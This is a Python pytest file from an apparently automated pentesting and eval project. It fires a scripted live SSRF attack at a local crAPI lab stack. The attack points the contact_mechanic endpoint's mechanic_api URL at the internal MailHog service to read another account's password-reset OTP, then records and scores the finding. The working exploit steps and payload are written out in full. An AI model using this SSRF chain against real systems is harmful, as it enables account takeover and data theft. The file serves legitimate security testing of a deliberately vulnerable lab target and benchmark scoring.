"""A real live-target run: fire at an actual running crAPI stack, record what
was found with the real record_finding tool, and score it with the eval
harness.

Requires crAPI's own (large, multi-service) compose stack already running,
per this project's own docker-compose.crapi.yml wrapper:
    CRAPI_COMPOSE_PATH=/path/to/crAPI/deploy/docker/docker-compose.yml \
        docker compose -f docker-compose.crapi.yml up -d

Marked ``live`` (this project's existing pytest marker convention, see
pyproject.toml) and skipped when nothing answers at the expected port -
matching test_eval_live_vampi.py's exact same convention, rather than
relying solely on a marker to be excluded from a default run. Its own
standing discipline is that a lab-target container is brought up only for a
live run and torn down immediately after, never left running between
sessions.

Mirrors test_eval_live_vampi.py's own scope exactly: this fires a small,
fully scripted sequence of real requests and calls record_finding directly,
not a full autonomous AgentLoop run - see that file's own docstring for why
an end-to-end LLM-driven live run is a separate, dedicated test
(test_eval_live_vampi_agent.py's own pattern).

The vulnerability exercised is a real, unauthenticated-to-anyone-with-an-
account SSRF: ``POST /workshop/api/merchant/contact_mechanic`` accepts a
caller-controlled ``mechanic_api`` URL and the workshop service fetches it
server-side with no allowlist at all (confirmed by reading crAPI's own real
source, services/workshop/crapi/merchant/views.py's ContactMechanicView -
``requests.get(request_data["mechanic_api"], ...)``, no host validation
anywhere on that path). Pointed at the compose stack's own MailHog service
(reachable by internal Docker DNS as ``mailhog``, never exposed to this
test's own caller directly except via the SSRF itself), any authenticated
user can read every captured email in the whole stack, including another
account's real password-reset OTP - confirmed against a real running
instance of this exact compose stack before writing this test, not assumed
from crAPI's own documentation.
"""

from __future__ import annotations

import json
import socket
import uuid

import httpx
import pytest

from lalo.agent.tools import ToolRegistry
from lalo.eval.cases import BenchmarkCase, run_case
from lalo.eval.scoring import score_composite
from lalo.execution.firer import HttpFirer
from lalo.execution.scope import ScopeGuard
from lalo.execution.target import Engagement
from lalo.findings.tool import build_record_finding_tool
from lalo.graph.model import ReachabilityGraph

CRAPI_HOST = "127.0.0.1"
CRAPI_PORT = 8888
CRAPI_URL = f"http://{CRAPI_HOST}:{CRAPI_PORT}"

_JSON_HEADERS = {"Content-Type": "application/json"}


def _crapi_reachable() -> bool:
    try:
        with socket.create_connection((CRAPI_HOST, CRAPI_PORT), timeout=0.5):
            return True
    except OSError:
        return False


def _signup_and_login(firer: HttpFirer, email: str) -> str:
    # crAPI enforces a unique phone number per account too, not just email -
    # a fixed literal here would collide across the two signups this test
    # does (and across repeat runs against a not-yet-torn-down instance).
    number = str(uuid.uuid4().int)[:10]
    signup = firer.fire(
        "POST",
        f"{CRAPI_URL}/identity/api/auth/signup",
        headers=_JSON_HEADERS,
        content=json.dumps(
            {"name": "Eval User", "email": email, "number": number, "password": "Password123!"}
        ).encode("utf-8"),
    )
    assert signup.fired is True
    assert signup.status == 200, f"signup failed for {email}: {signup.body!r}"
    login = firer.fire(
        "POST",
        f"{CRAPI_URL}/identity/api/auth/login",
        headers=_JSON_HEADERS,
        content=json.dumps({"email": email, "password": "Password123!"}).encode("utf-8"),
    )
    assert login.fired is True and login.status == 200, f"login failed for {email}: {login.body!r}"
    token = json.loads(login.body.decode("utf-8"))["token"]
    return str(token)


_SSRF_CVSS = {
    "attack_vector": "N",
    "attack_complexity": "L",
    "privileges_required": "L",
    "user_interaction": "N",
    "scope": "C",
    "confidentiality": "H",
    "integrity": "N",
    "availability": "N",
}


@pytest.mark.live
@pytest.mark.skipif(not _crapi_reachable(), reason="crAPI is not running on 127.0.0.1:8888")
def test_live_crapi_contact_mechanic_ssrf_leaks_another_users_otp() -> None:
    engagement = Engagement.from_specs(["127.0.0.1:8888"])
    scope = ScopeGuard(engagement=engagement)
    firer = HttpFirer(scope, client=httpx.Client())

    run_id = uuid.uuid4().hex[:8]
    attacker_email = f"attacker-{run_id}@example.com"
    victim_email = f"victim-{run_id}@example.com"

    attacker_token = _signup_and_login(firer, attacker_email)
    _signup_and_login(firer, victim_email)

    # The victim's own OTP mail now sits in the shared MailHog inbox - the
    # attacker never receives it directly and has no legitimate way to see
    # this specific message through any crAPI-facing endpoint.
    forget = firer.fire(
        "POST",
        f"{CRAPI_URL}/identity/api/auth/forget-password",
        headers=_JSON_HEADERS,
        content=json.dumps({"email": victim_email}).encode("utf-8"),
    )
    assert forget.fired is True and forget.status == 200

    ssrf_result = firer.fire(
        "POST",
        f"{CRAPI_URL}/workshop/api/merchant/contact_mechanic",
        headers={**_JSON_HEADERS, "Authorization": f"Bearer {attacker_token}"},
        content=json.dumps({"mechanic_api": "http://mailhog:8025/api/v2/messages"}).encode("utf-8"),
    )
    assert ssrf_result.fired is True
    assert ssrf_result.status == 200
    body = ssrf_result.body.decode("utf-8")
    # The unmistakable proof: an authenticated but otherwise-unprivileged
    # attacker account, calling an endpoint that has nothing to do with mail,
    # receives another account's own real inbox contents back.
    assert victim_email in body

    graph = ReachabilityGraph()
    registry = ToolRegistry([build_record_finding_tool(graph)])
    record_result = registry.dispatch(
        "record_finding",
        {
            "title": "SSRF in contact_mechanic leaks another account's password-reset OTP",
            "description": (
                "The mechanic_api field of POST /workshop/api/merchant/contact_mechanic "
                "is fetched server-side with requests.get() and no host allowlist. "
                "Pointing it at the internal MailHog service returns every captured "
                "email in the stack, including another account's password-reset OTP - "
                "any authenticated account can read it regardless of ownership."
            ),
            "vuln_class": "ssrf",
            "target": f"{CRAPI_URL}/workshop/api/merchant/contact_mechanic",
            "param": "mechanic_api",
            "evidence": [body],
            "evidence_excerpt": victim_email,
            "counterevidence": (
                "The attacker account has no relationship to the victim account and "
                "never received this message through any legitimate channel."
            ),
            "severity_change_conditions": (
                "Completing the password reset with the leaked OTP would raise this to "
                "a full account-takeover chain."
            ),
            "remediation": "Allowlist the mechanic_api host, or remove caller control over it.",
            "cvss_breakdown": _SSRF_CVSS,
        },
    )
    assert record_result.ok is True

    case = BenchmarkCase(
        name="crapi-live-smoke",
        description="A narrow live smoke case: one known crAPI primitive, not the full target.",
        ground_truth_classes=frozenset({"ssrf"}),
    )
    case_result = run_case(case, graph)
    assert case_result.found_classes == frozenset({"ssrf"})

    composite = score_composite([case_result])
    assert composite.mean_recall == 1.0
    assert composite.mean_precision == 1.0
    assert composite.case_count == 1
